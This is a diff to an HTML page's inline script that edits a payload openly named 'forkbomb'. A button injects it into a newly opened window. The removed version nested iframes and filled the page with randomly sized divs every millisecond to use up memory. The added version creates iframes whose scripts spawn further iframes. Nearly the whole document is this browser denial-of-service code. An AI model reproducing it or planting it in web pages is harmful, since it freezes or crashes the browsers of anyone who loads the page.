@@ -7,24 +7,21 @@
     <script>
       let inject = document.getElementById("kill");
       const forkbomb = `
-      // Activate forkbomb on page load
-      (function() {
-        for (let i = 0; i < 2; i++) {
-          let iframe = document.createElement('iframe');
-          let script = document.createElement('script');
-          script.innerHTML = forkbomb; // Corrected line
-          iframe.contentWindow.document.body.appendChild(script);
-        }
+  (function() {
+    const createIframe = () => {
+        const iframe = document.createElement('iframe');
+        document.body.appendChild(iframe);
+        iframe.src = 'about:blank'; // Set to a blank page
+        iframe.onload = () => {
+            const script = document.createElement('script');
+            script.textContent = 'document.body.appendChild(document.createElement("iframe"));';
+            iframe.contentWindow.document.body.appendChild(script);
+        };
+    };
 
-        // Add randomized memory-gobbling elements
-        setInterval(function() {
-          let element = document.createElement('div');
-          element.style.width = Math.floor(Math.random() * 1000) + 'px';
-          element.style.height = Math.floor(Math.random() * 1000) + 'px';
-          element.style.backgroundColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
-          document.body.appendChild(element);
-        }, 1);
-      })();`;
+    createIframe(); // Initial call to create the first iframe
+})();
+`;
       inject.addEventListener("click", () => {
         let win = window.open();
         let script = win.document.createElement("script");
